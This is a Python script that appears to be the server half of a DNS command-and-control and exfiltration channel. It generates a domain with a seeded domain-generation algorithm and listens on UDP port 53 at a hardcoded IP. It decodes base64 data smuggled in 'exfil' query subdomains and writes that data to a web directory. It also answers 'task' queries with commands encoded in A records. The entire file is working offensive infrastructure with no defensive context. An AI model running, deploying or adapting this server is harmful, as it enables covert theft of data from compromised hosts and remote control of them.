#!/bin/python3.6

#imported libraries
import socket
from datetime import datetime
from dnslib import *
import base64

def dga(char_set=None, size=None, seed=None):
	if not char_set:
		char_set = 'etaoinsrhldcumfpgw'
	if not size:
		size = 10
	if not seed:
		seed = round(int(datetime.utcnow().strftime('%s')), -1)

	tld_list = ['info', 'tk', 'us', 'tech']
	random.seed(seed)

	domain = ''.join(random.choice(char_set) for _ in range(size))

	tld = random.choice(tld_list)
	fqdn = domain + '.' + tld
	return fqdn

def recieve_dns(sock):
	try:
		data, addr = sock.recvfrom(1024)
		return data, addr
	except Exception as err:
		print("couldnt receive data: \n" + str(err))
			
def create_dns(data):
	request = DNSRecord.parse(data)
	reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
	qname = str(request.q.qname)
	qn_tmp = qname.strip('.').split('.')
	qtype = request.q.qtype
	qt = QTYPE[qtype]
	
	if len(qn_tmp) == 5:
		print(qn_tmp[2])
		if qn_tmp[2] == 'exfil':
			payload = qn_tmp[0]
			padding_mod = len(payload) % 4
			padding = 4 - padding_mod
			payload = payload + padding * '='
			payload = base64.b64decode(payload)
			id = qn_tmp[1]
			print(payload)
			with open ('/var/www/html/' + str(id), 'wb') as o:
				o.write(payload)
			response_record = '104.131.53.79'
		elif qn_tmp[2] == 'task':
			cache_bust = ord(qn_tmp[0])
			id = qn_tmp[1]
			qn = '.'.join(qn_tmp[2:]) + '.'
			response_record = '.'.join([str(cache_bust), id, give_task])
	else:
		qn = '.'.join(qn_tmp) + '.'
		response_record = '104.131.53.79'
		#response_record = '1.1.1.1'
	
	reply.add_ar(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=NS(dga_domain)))
	reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, "A"), rclass=1, ttl=TTL, rdata=A(response_record)))
	reply = reply.pack()
	return reply

def respond_dns(reply, addr):
	try:
		sock.sendto(reply, addr)
	except Exception as err:
		print("response err:\n")
		print(err)

#Establish tasking domain and ip info
dga_domain = dga(seed="1533254400")
print(dga_domain)
ask_task = "task." + dga_domain + "."
give_task = '1.1' #switch from 1's to indicate task is coming
#give_task = '2.5'


#Create a UDP socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

port = 53
ip = "104.131.53.79"
TTL = 60

sock.bind((ip,port))



try:
	while True:
		data, addr = recieve_dns(sock)
		reply = create_dns(data)
		respond_dns(reply, addr)

except KeyboardInterrupt:
	raise
except Exception as err:
	print (err)
